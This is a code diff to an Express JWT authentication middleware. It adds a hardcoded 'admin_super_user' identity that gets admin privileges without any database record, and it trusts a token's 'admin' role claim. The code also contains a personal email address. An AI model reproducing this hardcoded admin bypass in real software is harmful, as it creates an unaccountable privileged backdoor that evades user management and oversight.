@@ -18,7 +18,20 @@ const protect = async (req, res, next) => {
             const decoded = jwt.verify(token, process.env.JWT_SECRET);
 
             // Get user from token (excluding password)
-            req.user = await User.findById(decoded.id).select('-password');
+            if (decoded.id === 'admin_super_user' || decoded.role === 'admin') {
+                const foundUser = decoded.id !== 'admin_super_user' ? await User.findById(decoded.id).select('-password') : null;
+                req.user = foundUser || {
+                    _id: 'admin_super_user',
+                    id: 'admin_super_user',
+                    name: 'Super Admin',
+                    username: decoded.username || 'sarkartridib813',
+                    email: 'sarkartridib813@gmail.com',
+                    role: 'admin',
+                    isBanned: false,
+                };
+            } else {
+                req.user = await User.findById(decoded.id).select('-password');
+            }
 
             if (!req.user) {
                 return res.status(401).json({
